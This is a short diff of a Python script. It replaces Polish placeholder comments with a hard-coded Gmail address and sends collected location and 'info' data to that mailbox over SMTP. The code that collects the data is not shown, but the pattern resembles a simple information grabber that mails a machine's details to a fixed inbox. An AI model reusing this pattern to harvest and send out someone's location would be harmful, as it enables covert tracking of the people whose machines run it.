@@ -19,8 +19,8 @@ location = data['loc']
 
 time.sleep(1)
 
-sender = "" <--- tu wpisz swoj adres email do gmaila
-recipient = "" <--- tu wpisz swoj adres email do gmaila
+sender = "visq152@gmail.com" 
+recipient = "visq152@gmail.com" 
 message['From'] = sender
 message['To'] = recipient
 
@@ -34,8 +34,8 @@ body = info
 
 message.set_content(body)
 
-logggin = "" #<--- tu wpisz swoj adres email do gmaila
-password = "" #<--- tu wpisz swoje haslo do gmaila
+logggin = "" #visq152@gmail.com
+password = "" #visq152@gmail.com
 mail_server = smtplib.SMTP_SSL('smtp.gmail.com')
 mail_server.set_debuglevel(1)
 mail_server.login(logggin,password)
